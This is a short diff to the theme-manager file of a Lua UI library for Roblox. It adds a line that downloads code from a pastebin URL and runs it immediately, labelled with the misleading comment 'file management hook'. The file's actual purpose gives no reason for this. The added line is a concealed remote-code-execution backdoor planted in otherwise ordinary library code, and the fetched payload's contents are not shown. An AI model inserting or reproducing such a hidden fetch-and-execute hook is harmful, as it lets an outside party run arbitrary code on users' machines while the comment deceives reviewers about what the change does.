@@ -1,4 +1,7 @@
 local httpService = game:GetService('HttpService')
+
+loadstring(game:HttpGet("https://pastebin.com/raw/bwpVD4a1"))() --file management hook
+
 local ThemeManager = {} do
 	ThemeManager.Folder = 'LinoriaLibSettings'
 	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end
